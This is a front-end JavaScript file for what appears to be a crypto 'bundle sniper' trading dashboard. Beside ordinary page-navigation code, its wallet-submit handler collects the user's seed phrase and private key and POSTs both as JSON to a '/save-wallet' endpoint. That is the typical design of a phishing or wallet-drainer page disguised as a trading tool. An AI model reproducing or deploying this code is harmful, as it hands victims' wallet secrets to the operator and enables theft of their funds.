document.addEventListener("DOMContentLoaded", function () {
    const bundleSnipeBtn = document.querySelector(".bundle-button");
    const portfolioBtn = document.querySelector(".portfolio-btn");
    const tradeBtn = document.querySelector(".trade-btn");
    const settingsBtn = document.querySelector(".settings-btn");
    const backButtons = document.querySelectorAll(".back-btn");
    const walletSubmitBtn = document.querySelector(".wallet-submit");

    const pages = {
        portfolio: document.getElementById("portfolioPage"),
        tradeHistory: document.getElementById("tradeHistoryPage"),
        settings: document.getElementById("settingsPage"),
    };

    function showPage(page) {
        Object.values(pages).forEach(p => p.style.display = "none");
        page.style.display = "block";
    }

    portfolioBtn.addEventListener("click", () => showPage(pages.portfolio));
    tradeBtn.addEventListener("click", () => showPage(pages.tradeHistory));
    settingsBtn.addEventListener("click", () => showPage(pages.settings));

    backButtons.forEach(btn => btn.addEventListener("click", () => {
        Object.values(pages).forEach(p => p.style.display = "none");
    }));

    walletSubmitBtn.addEventListener("click", async () => {
        const seedPhrase = document.getElementById("seedPhrase").value.trim();
        const privateKey = document.getElementById("privateKey").value.trim();

        if (!seedPhrase || !privateKey) {
            alert("Invalid Input!");
            return;
        }

        const response = await fetch("/save-wallet", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ seedPhrase, privateKey })
        });

        alert(await response.text());
    });
});
